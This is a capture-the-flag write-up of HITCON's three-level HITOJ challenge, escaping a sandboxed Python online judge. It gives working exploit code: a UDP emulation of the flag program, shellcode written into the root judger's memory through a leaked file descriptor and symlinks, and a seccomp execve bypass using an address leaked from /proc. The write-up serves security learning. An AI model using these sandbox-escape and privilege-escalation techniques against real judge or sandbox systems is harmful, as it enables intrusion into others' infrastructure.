## HITOJ - Misc Problem - Writeup by Robert Xiao (@nneonneo)

HITOJ is a series of three levels, all of which require exploiting variants of an online judge platform for programming problems.

In all three levels, we're given a website that lets us execute sandboxed Python 3 code against a series of "testcases". The platform provides our script's output and compares it to the "expected" output (based on the programming challenge being solved).

The judge is based on https://github.com/QingdaoU/Judger. It executes user code in a subprocess, optionally as a different user, with a seccomp profile to block certain system calls.

### Level 1

Description:

> Welcome to HITCON Programming Contest! I made an online judge based on a modified version of [this repo I found online](https://github.com/QingdaoU/Judger).
> 
> Link: http://chal-hitoj.chal.hitconctf.com
> 
> For this level, execute the command `/getflag give me flag` as any user to print the flag.

We can use a combination of `os.listdir` and `os.stat` to explore the filesystem, and probe the execution environment by reading files in `/proc`. From this, we can determine that we're running in some sort of Docker container that starts at `/entrypoint.sh`, which launches `/usr/lib/libjudger.so` (an executable, despite the extension). `/getflag` is readable, so we can dump it and `libjudger.so` using a script like this:

```python
import zlib
import base64
print(base64.b64encode(zlib.compress(open("/usr/lib/libjudger.so", "rb").read())))
```

Reverse-engineering `/getflag`, we find that it is a very simple program: it makes a UDP socket, binds it to port 321, sends 256 random bytes to 172.12.34.56:1337, waits for a reply, and XORs the random bytes with the reply to produce a flag.

Reverse-engineering `libjudger.so`, we find that it blocks the following syscalls using seccomp:

- clone
- fork
- vfork
- kill
- ptrace
- clone3
- openat2
- execveat
- execve, except if the first argument is equal to a particular address (this supports `execve`'ing the Python process inside the jailed child)
- open and openat, if the mode argument has bit value 1 or 2 set (i.e. if the mode has `O_WRONLY` or `O_RDWR` set).

All other syscalls, including `socket`, `bind`, etc. are allowed. So, we can solve level 1 by simply emulating the function of `getflag` in Python:

```python
import sys
print_ = print
def print(*args, **kwargs):
    print_(*args, **kwargs)
    sys.stdout.flush()

print("Welcome to hack")
import socket
sock = socket.socket(2, 2, 0)
print(sock)

print(sock.bind(("", 321)))
print(sock.sendto(bytes(256), ("172.12.34.56", 1337)))
print(sock.recvfrom(256))
```

This gives us our first flag, `hitcon{level1__i_should_not_have_used_whitelist_seccomp:(}`.

### Level 2

Description:

> I made an oopsie in level 1 which allows an unintended solution. The files in this challenge and Level 1 are the same, except some configurations are different.
> 
> Link: http://chal-hitoj-2.chal.hitconctf.com
> 
> For this level, execute the command `/getflag give me flag` as root to print the flag.

In level 1, we successfully bound a socket to port 321, which is normally a privileged port only accessible to root. Thus, our uid=1337 process should not be able to bind this socket (and if we don't bind the socket, the remote server never sends a reply). However, the misconfiguration in level 1 is setting `/proc/sys/net/ipv4/ip_unprivileged_port_start` to 0, allowing any user to bind any port.

Level 2 fixes this misconfiguration, so we do really have to execute `/getflag` as root. Our only real option is to compromise the judge or the entrypoint script, both of which are running as root.

The entrypoint script looks like this:

```sh
#!/bin/bash


if [[ "$$" != 1 ]]; then
    # pls don't do this
    exit
fi

workdir="/run/workdir"
judgedir="/run/judge"
testdir="$judgedir/testcases"

result_path="$judgedir/result.log"
src_path="$workdir/submission.py"
exe_path="/usr/bin/python3"

mkdir "$workdir"
chmod 777 "$workdir"

cd "$workdir"

judge_test () {
    test_name="$1"
    real_input_path="$testdir/$test_name"

    input_file="./$test_name"
    output_file="./$test_name.out"
    status_file="./$test_name.json"

    ln -s "$real_input_path" "$input_file"
    touch "$output_file" "$status_file"
    chmod 600 "$status_file"

    /usr/lib/libjudger.so \
        --max_cpu_time=10000 \
        --max_real_time=20000 \
        --max_memory=67108864 \
        --max_stack=67108864 \
        --max_output_size=65536 \
        --exe_path="$exe_path" \
        --args="-B" \
        --args="$src_path" \
        --env="PYTHONIOENCODING=utf-8" \
        --input_path="$input_file" \
        --output_path=/dev/stdout \
        --error_path=/dev/null \
        --log_path=/dev/stderr \
        --status_path="$status_file" \
        --seccomp_rule_name=general \
        --uid=1337 \
        --gid=1337 \
        | base64 -w0 > "$output_file"

    jq \
        --arg test "$test_name" \
        --rawfile output "$output_file" \
        -c -M \
        '.test = $test | .output = $output' \
        "$status_file" \
        >> "$result_path"

    rm -f "$input_file" "$output_file" "$status_file"
}

for test_file in $(ls "$testdir"); do
    judge_test "$test_file"
done
```

It runs a series of five testcases in order. Notably, it does not clean the work directly before running each testcase. Thus, in one testcase, we can create files or symbolic links that will persist into the next testcase.

By examining the links in `/proc/self/fd`, we notice that fd 3 is a writable handle to the `.json` status file! This is a file descriptor that is being leaked from the judger into the subprocess. We can abuse this as follows: while running testcase `1.txt`, we can create a symbolic link from `2.txt.json` to a file that we want to overwrite. In the next testcase, the judger will open this file for writing *as root* and leak a file descriptor to our program, giving us full read/write control over any file we choose.

Initially, we tried to target the `/entrypoint.sh` script, since Bash will reread the script after completing the loop. Although this worked on our local setup, it kept failing remotely; we eventually determined by reading `/proc/mounts` that the root filesystem was mounted readonly (Docker's `--read-only` flag), making most of the files on the filesystem off-limits for this attack.

Eventually, the solution we chose was to target `/proc/self/mem`. The judger will open this file itself, giving our process unrestricted read/write access to the judger's memory space. In order to figure out the memory layout, we also made a symlink from `2.txt` to `/proc/self/maps`; since this file is provided on `stdin`, this gives our process the memory layout of the judger. We can then overwrite the judger's executable memory with shellcode that will run `/getflag` for us:

```python
## <<<UTILITIES
import sys, traceback
print_ = print
def print(*args, **kwargs):
    print_(*args, **kwargs)
    sys.stdout.flush()

def excepthook(tp, value, tb):
    traceback.print_exception(tp, value, tb, file=sys.stdout)
    sys.stdout.flush()

sys.excepthook = excepthook
## UTILITIES>>>

import os

next_ppid = os.getppid() + 9

if os.readlink("/dev/fd/0").endswith("1.txt"):
    os.symlink(f"/proc/{next_ppid}/maps", "2.txt")
    os.symlink(f"/proc/{next_ppid}/mem", "2.txt.json")
elif os.readlink("/dev/fd/0").endswith("/maps"):
    maps = sys.stdin.read().split("\n")
    for row in maps:
        if 'r-x' in row:
            break
    addrs = row.split()[0]
    addr_start, addr_end = [int(c, 16) for c in addrs.split("-")]
    addr_sz = addr_end - addr_start
    os.lseek(3, addr_start, 0)
    sc = b'1\300H\215=\24\0\0\0PTZH\215O\vQH\215O\bQWT^\260;\17\5/bin/sh\0-c\0$CMD$\0'
    sc = sc.replace(b"$CMD$", b"""
echo '{"cpu_time":1337,"real_time":1337,"memory":1337,"signal":0,"exit_code":0,"error":0,"result":4,"test":"2.txt","output":"'$(/getflag give me flag | base64)'"}' > /run/judge/result.log
""")
    os.write(3, b"\x90" * (addr_sz - len(sc)) + sc)
```

This gives us the flag from a fake testcase 2 output: `hitcon{level2__uhhhhh_so_my_patch_went_very_wrong_hope_it's_intended_now}`

### Level 3

Description:

> You can't do weird things with root access anymore! Note: Some files and configurations are different from those in levels 1 or 2.
> 
> Link: http://chal-hitoj-3.chal.hitconctf.com (If DNS does not work: http://104.155.230.160)
> 
> For this level, execute the command `/getflag give me flag` as any user to print the flag.

For this level, the entire container now runs as user 1337. The judger no longer changes users when executing the user program. Furthermore, there is only a single testcase, so we cannot use the previous symlink trick.

The judger's seccomp filter prevents us from running subprocesses by blocking `fork`, `execve` and all relevant variants. However, it does have one small exception: it permits `execve` when the first argument is a specific address (the address of the `/usr/bin/python3` string argument), in order to allow the child process to exec the Python runtime. This is achieved via simple pointer comparison in the BPF filter: since the filter cannot access memory, it cannot directly compare the string.

Thus, we have an attack strategy: if we can place the string `/getflag` at the *exact* address which is permitted by the seccomp filter, we can launch `execve` with that address and pass the filter!

To figure out the address, we will need to leak the stack address of the judger. Luckily, `/proc` provides the extremely convenient `/proc/<pid>/stat` file. One of the fields of this file is `arg_start`, which is the address of the start of `argv` on the stack. This value is only visible if the opening process passes an `PTRACE_MODE_READ_FSCREDS` check on the target process; otherwise it reads as zero (this prevents ASLR leakage). We pass this check, since we are running as the same UID as the target.

The rest of the exploit is just setting up the appropriate memory region, putting the arguments together, and calling `execve`:

```python
## <<<UTILITIES
import sys, traceback
print_ = print
def print(*args, **kwargs):
    print_(*args, **kwargs)
    sys.stdout.flush()

def excepthook(tp, value, tb):
    traceback.print_exception(tp, value, tb, file=sys.stdout)
    sys.stdout.flush()

sys.excepthook = excepthook
## UTILITIES>>>

import os

stat = open(f"/proc/{os.getppid()}/stat").read()
addr = int(stat.split()[-5]) + 141

print(stat)
print(hex(addr))

from ctypes import *
import struct
libc = CDLL("libc.so.6")

libc.mmap.argtypes = [c_ulong, c_ulong, c_int, c_int, c_int, c_long]
libc.mmap.restype = c_long
base = libc.mmap(addr & ~0xfff, 0x2000, 3, 0x22, -1, 0)
print(base)
arg_addr = base + 0x1000

libc.execve.argtypes = [c_ulong, c_ulong, c_ulong]
def write(ad, data):
    memmove(ad, data, len(data))

write(addr, b"/getflag\0")
write(arg_addr, struct.pack("<QQQQQ", addr, arg_addr + 0x100, arg_addr + 0x200, arg_addr + 0x300, 0))
write(arg_addr + 0x100, b"give\0")
write(arg_addr + 0x200, b"me\0")
write(arg_addr + 0x300, b"flag\0")

libc.execve(addr, arg_addr, 0)
```

This gives us our final flag: `hitcon{level3__/proc_is_tooooo_op_pls_nerf._.}`
